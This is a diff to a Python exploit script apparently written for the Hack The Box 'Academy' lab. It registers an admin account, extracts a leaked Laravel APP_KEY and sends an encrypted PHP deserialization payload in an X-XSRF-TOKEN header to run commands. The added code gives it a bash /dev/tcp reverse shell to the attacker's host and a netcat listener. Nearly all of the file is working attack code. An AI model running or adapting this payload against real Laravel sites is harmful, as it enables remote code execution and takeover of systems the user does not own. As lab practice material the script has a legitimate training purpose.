@@ -1,31 +1,22 @@
 #!/usr/bin/env python3
-
-import argparse
-import re
-import requests
-import rich
-import sys
-import time
-import os
-import base64
 from Crypto.Cipher import AES
 from hashlib import sha256
 from Crypto.Util.Padding import pad
-import hmac
-import json
-import signal
-import pdb
+import hmac, json, base64, os, time, sys, rich, requests, re, argparse, pdb, socket, threading, subprocess, signal
+
+
 # Argument parser
 parser = argparse.ArgumentParser()
 parser.add_argument("-rhost", "--rhost", help="Remote host", required=True)
 parser.add_argument("-lhost", "--lhost", help="Local host", required=True)
 parser.add_argument("-lport", "--lport", help="Local port", required=True)
-parser.add_argument("-c", "--command", help="command", required=True)
+parser.add_argument("-r", "--rev", help="Reverse Shell", action="store_true")
+parser.add_argument("-c", "--command", help="command", required=False)
 
 args = parser.parse_args()
 lhost = args.lhost
-lport = args.lport
 rhost = args.rhost
+lport = args.lport
 com = args.command
 
 main_url = "http://academy.htb/"
@@ -44,7 +35,7 @@ def checkHosts():
             time.sleep(1)
             rich.print("[yellow][!] Adding it to /etc/hosts [/yellow]")
             time.sleep(1)
-            os.system(f"echo '{lhost} academy.htb' >> /etc/hosts")
+            os.system(f"echo '{rhost} academy.htb' >> /etc/hosts")
 
 def MakeRequest():
     s = requests.Session()
@@ -56,92 +47,118 @@ def MakeRequest():
         'roleid': '1'
     }
 
+    ## Change this to your PHPSESSID value if you want. Not needed tho##
     cookies = {
         'PHPSESSID': 'qlk0p3q8nbigpddhnr24r5l58l'
     }
 
-    register_url= main_url + "register.php"
+    register_url = main_url + "register.php"
     try:
         r = s.post(register_url, data=data, cookies=cookies)
         if r.status_code == 200:
             rich.print("[green][+] Account created successfully. [/green]")
             rich.print("[yellow][+] Credentials -> rootme:rootme [/yellow]")
     except:
-        rich.print("[red][!] Failed to create an account [/red]")
+        rich.print("[red][!] Account created [/red]")
 
-    # Add new host to /etc/hosts
-    rich.print("[yellow][+] New host discovered: dev-staging-01.academy.htb -> Adding it to /etc/hosts [/yellow]")
-    with open('/etc/hosts', 'r') as file:
-        data = file.read().replace('\n', '')
-        if "dev-staging-01.academy.htb" not in data:
-            time.sleep(1)
-            os.system(f"echo '{lhost} dev-staging-01.academy.htb' >> /etc/hosts")
+    # Add new host to /etc/hosts if not added yet
+    with open('/etc/hosts', 'r') as check:
+        if "dev-staging-01.academy.htb" not in check.read():
+            rich.print("[yellow][+] New host discovered: dev-staging-01.academy.htb -> Adding it to /etc/hosts [/yellow]")
+            with open('/etc/hosts', 'r') as file:
+                data = file.read().replace('\n', '')
+                if "dev-staging-01.academy.htb" not in data:
+                    time.sleep(1)
+                    os.system(f"echo '{rhost} dev-staging-01.academy.htb' >> /etc/hosts")
 
-def Exploit():
+def exploit_thread():
+    def Exploit():
+        # Extract API_KEY
+        s = requests.get("http://dev-staging-01.academy.htb/")
+        source_code = s.text
+        pattern = r'base64:([\w/+]+=*)'
+        api_key = re.search(pattern, source_code)[1]
 
-    # Extract API_KEY
-    s = requests.get("http://dev-staging-01.academy.htb/")
-    source_code = s.text
-    pattern = r'base64:([\w/+]+=*)'
-    api_key = re.search(pattern, source_code)[1]
+        rich.print("[blue][+] Laravel 5.X version detected. [/blue]")
+        rich.print("[yellow][+] Exploiting it... [/yellow]")
 
-    rich.print("[blue][+] Laravel 5.X version detected. [/blue]")
-    rich.print("[yellow][+] Exploiting it... [/yellow]")
-    
-    key = api_key
-    comand = com
-    payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(
-        len(comand)) + ':"' + comand + '";}'
+        key = api_key
+        if args.rev:
+            comand = f"bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'"
+        else:
+            comand = com
 
-    # Base64 encoded
-    base64_payload = base64.b64encode(payload.encode()).decode('utf-8')
+        payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(comand)) + ':"' + comand + '";}'
 
-    # Base64 decoded key
-    base64_decoded_key = base64.b64decode(key)
+        # Base64 encoded
+        base64_payload = base64.b64encode(payload.encode()).decode('utf-8')
 
-    # AES Encrypt the payload:
-    cipher = AES.new(base64_decoded_key, AES.MODE_CBC)
-    value = cipher.encrypt(pad(base64.b64decode(base64_payload), AES.block_size))
-    payload_def = base64.b64encode(value)
+        # Base64 decoded key
+        base64_decoded_key = base64.b64decode(key)
 
-    # IV base64 encoded
-    iv_base64 = base64.b64encode(cipher.iv)
+        # AES Encrypt the payload:
+        cipher = AES.new(base64_decoded_key, AES.MODE_CBC)
+        value = cipher.encrypt(pad(base64.b64decode(base64_payload), AES.block_size))
+        payload_def = base64.b64encode(value)
 
-    # Hashing mac
-    hashed_mac = hmac.new(base64_decoded_key, iv_base64 + payload_def, sha256).hexdigest()
+        # IV base64 encoded
+        iv_base64 = base64.b64encode(cipher.iv)
 
-    # Decoded from base64
-    iv_decoded_base64 = iv_base64.decode('utf-8')
-    payload_decoded_base64 = payload_def.decode('utf-8')
+        # Hashing mac
+        hashed_mac = hmac.new(base64_decoded_key, iv_base64 + payload_def, sha256).hexdigest()
 
-    # Data that will be sent through the request
-    data = {
-        'iv': iv_decoded_base64,
-        'value': payload_decoded_base64,
-        'mac': hashed_mac
-    }
+        # Decoded from base64
+        iv_decoded_base64 = iv_base64.decode('utf-8')
+        payload_decoded_base64 = payload_def.decode('utf-8')
 
-    # Json form data
-    json_data = json.dumps(data)
+        # Data that will be sent through the request
+        data = {
+            'iv': iv_decoded_base64,
+            'value': payload_decoded_base64,
+            'mac': hashed_mac
+        }
 
-    # Final payload encoded
-    final_payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')
+        # Json form data
+        json_data = json.dumps(data)
 
-    headers = {
-        'X-XSRF-TOKEN': final_payload_encoded
-    }
+        # Final payload encoded
+        final_payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')
 
-    proxy = {
-        'http': 'http://localhost:8080',
-        'https': 'https://localhost:8080'
-    }
+        headers = {
+            'X-XSRF-TOKEN': final_payload_encoded
+        }
 
-    url = "http://dev-staging-01.academy.htb/"
-    r = requests.post(url=url, headers=headers)
+        # Proxy in case you want to add id to the request and analyze it through burp
+        proxy = {
+            'http': 'http://localhost:8080',
+            'https': 'https://localhost:8080'
+        }
 
-    print(r.text.split('<!DOCTYPE html>')[0])
+        url = "http://dev-staging-01.academy.htb/"
+        try:
+            r = requests.post(url=url, headers=headers)
+            rich.print(r.text.split('<!DOCTYPE html>')[0])
+        except:
+            rich.print("[red][!] Exploit failed [/red]")
+
+    t1 = threading.Thread(target=Exploit)
+    t1.start()
+    t1.join()
+
+def shell():
+    def spawnShell():
+        subprocess.Popen(["nc", "-lvp", "4444"])
+    t2 = threading.Thread(target=spawnShell)
+    t2.start()
+    t2.join()
 
 if __name__ == "__main__":
     checkHosts()
+    shell()
     MakeRequest()
-    Exploit()
+    lport = 4444
+    exploit_thread()
+
+
+
+
